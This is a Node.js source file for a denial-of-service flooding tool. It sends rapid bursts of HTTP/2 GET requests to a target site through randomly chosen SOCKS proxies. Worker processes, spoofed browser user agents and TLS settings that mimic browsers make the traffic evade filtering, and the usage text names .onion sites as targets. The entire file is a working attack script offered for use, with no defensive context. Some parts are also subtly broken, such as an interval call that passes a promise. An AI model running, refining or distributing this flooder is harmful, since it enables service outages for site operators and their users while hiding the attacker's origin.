const fs = require('fs');
const cluster = require('cluster');
const crypto = require('crypto');
const { SocksClient } = require('socks');
const tls = require('tls');
const dns = require('dns');
const http2 = require('http2');
const { PassThrough } = require('stream');
const argv = require('minimist')(process.argv.slice(2));
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxytor = process.argv[6];

if (process.argv.length < 7) {
  console.log(`\n${'='.repeat(40)}`);
  console.log(`${'Usage:'.cyan} ${'TARGET TIME THREADS RATE PROXY'.yellow}`);
  console.log(`Example: ${'http://site.onion 60 15 80 proxy.txt'.green}`);
  console.log(`${'Note:'.blue} Make sure to use valid parameters and .onion address if applicable.`);
  console.log(`\n${'='.repeat(40)}\n`);
  process.exit(0);
}

let proxies;
try {
  proxies = fs.readFileSync(proxytor, 'utf-8').toString().split('\n').filter(proxy => {
    const parts = proxy.split(':');
    return parts.length === 2 && !isNaN(parts[1]);
  });
  if (proxies.length === 0) throw new Error('No valid proxies found.');
} catch (e) {
  console.log(`[Error] ${e.message}`);
  process.exit(0);
}

if (cluster.isPrimary) {
  console.log(`[+] Attack started on ${target} with ${threads} threads for ${time} seconds.`);
  for (let i = 0; i < threads; i++) cluster.fork();
  setTimeout(() => process.exit(0), time * 1000);
} else {
  setInterval(work());
}

const parsedURL = new URL(target);

function getFingerprint() {
  const currentDate = new Date().toISOString();
  const randomBytes = crypto.randomBytes(16);
  return crypto.createHash('sha256').update(currentDate + randomBytes.toString('hex')).digest('hex');
}

async function resolveDNS(hostname) {
  return new Promise((resolve, reject) => {
    dns.lookup(hostname, (err, address) => {
      if (err) return reject(err);
      resolve(address);
    });
  });
}

function generateUserAgent() {
  const browsers = [
    { name: 'Chrome', versions: ['91', '92', '93', '94', '95'] },
    { name: 'Firefox', versions: ['89', '90', '91', '92', '93'] },
    { name: 'Safari', versions: ['14', '15'] },
    { name: 'Edge', versions: ['91', '92', '93', '94'] },
    ];

  const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
  const randomVersion = randomBrowser.versions[Math.floor(Math.random() * randomBrowser.versions.length)];
  return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser.name}/${randomVersion}.0.0.0 Safari/537.36`;
}

async function work() {
  let ip;
  if (parsedURL.hostname.endsWith('.onion')) {
    ip = parsedURL.hostname;
  } else {
    try {
      ip = await resolveDNS(parsedURL.hostname);
      console.log(`[+] Resolved ${parsedURL.hostname} to ${ip}`);
    } catch (err) {
      console.log(`[Error] Could not resolve host: ${err.message}`);
      return;
    }
  }

  function flooder() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    const options = {
      proxy: { host: proxy[0], port: Number(proxy[1]), type: 4 },
      command: 'connect',
      destination: { host: ip, port: parsedURL.port || (parsedURL.protocol === 'https:' ? 443 : 80) }
    };

    SocksClient.createConnection(options, (err, info) => {
      if (err) return console.log(`[Error] Proxy connection failed: ${err.message}`);

      function makeRequest(socket) {
        const client = http2.connect(`${parsedURL.protocol}//${parsedURL.host}`, {
          createConnection: () => socket
        });

        client.on('error', err => console.log(`[Error] HTTP/2 connection error: ${err.message}`));

        for (let i = 0; i < ratelimit; i++) {
          const userAgent = generateUserAgent();
          const req = client.request({
            ":method": "GET",
            ":authority": parsedURL.host,
            ":path": parsedURL.pathname || '/',
            ":scheme": "https",
            "accept-language": 'en-US,en;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "user-agent": userAgent,
            "referer": target,
            "origin": parsedURL.origin,
            "connection": 'keep-alive',
            "upgrade-insecure-requests": '1',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-user": '?1',
            "sec-fetch-site": 'none',
          });

          req.on('response', (headers) => {
            console.log(`[+] Received status code: ${headers[":status"]}`);
          });

          req.setEncoding('utf8');
          req.on('data', () => {});
          req.on('end', () => req.close());
          req.end();
        }
      }

      const fingerprint = getFingerprint();
      const tlsOptions = {
        rejectUnauthorized: false,
        servername: parsedURL.hostname,
        ALPNProtocols: ['h2', 'http/1.1'],
        ecdhCurve: 'x25519:secp256r1:secp384r1',
        ciphers: `TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305:TLS_AES_256_GCM_SHA384`,
        sigalgs: `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256`,
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
          crypto.constants.SSL_OP_NO_SSLv3 |
          crypto.constants.SSL_OP_NO_TLSv1 |
          crypto.constants.SSL_OP_NO_TLSv1_1 |
          crypto.constants.ALPN_ENABLED |
          crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
          crypto.constants.SSL_OP_SINGLE_DH_USE |
          crypto.constants.SSL_OP_SINGLE_ECDH_USE,
        minVersion: 'TLSv1.2',
        handshakeTimeout: 10000,
        maxVersion: 'TLSv1.3',
        secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method']
      };

      const tlsSocket = tls.connect(tlsOptions, () => {
        makeRequest(tlsSocket);
      });

      tlsSocket.on('error', err => console.log(`[Error] TLS connection error: ${err.message}`));
    });
  }

  flooder();
}